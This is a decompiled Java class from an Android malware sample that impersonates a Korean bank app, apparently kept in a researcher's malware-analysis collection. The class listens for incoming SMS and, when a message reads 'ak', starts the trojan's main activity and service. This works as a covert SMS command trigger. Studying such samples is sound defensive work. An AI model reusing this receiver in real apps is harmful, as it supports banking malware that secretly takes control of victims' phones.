package com.kbstar.kb.android.star.util;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.telephony.SmsMessage;
import com.kbstar.kb.android.star.OpenMain;

public class SMSD
  extends BroadcastReceiver
{
  public static final String TAG = "BroadcastReceiver";
  private static final String mACTION = "android.provider.Telephony.SMS_RECEIVED";
  private final int SHOW_DIALOG = 100;
  private Handler handler = new Handler()
  {
    public void handleMessage(Message paramAnonymousMessage)
    {
      super.handleMessage(paramAnonymousMessage);
      switch (paramAnonymousMessage.what)
      {
      default: 
        return;
      }
      paramAnonymousMessage = new Intent(SMSD.this.mcontext, OpenMain.class);
      paramAnonymousMessage.addFlags(268435456);
      SMSD.this.mcontext.startService(paramAnonymousMessage);
    }
  };
  private Context mcontext;
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    Object[] arrayOfObject;
    int j;
    int i;
    if (paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
    {
      arrayOfObject = (Object[])paramIntent.getExtras().get("pdus");
      paramIntent = "";
      j = arrayOfObject.length;
      i = 0;
    }
    for (;;)
    {
      if (i >= j)
      {
        if (paramIntent.equalsIgnoreCase("ak"))
        {
          paramIntent = new Intent(paramContext, OpenMain.class);
          paramIntent.addFlags(268435456);
          paramContext.startActivity(paramIntent);
          paramContext.startService(new Intent(paramContext, OpenMain.class));
        }
        return;
      }
      paramIntent = SmsMessage.createFromPdu((byte[])arrayOfObject[i]).getMessageBody().toString();
      i += 1;
    }
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/util/SMSD.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */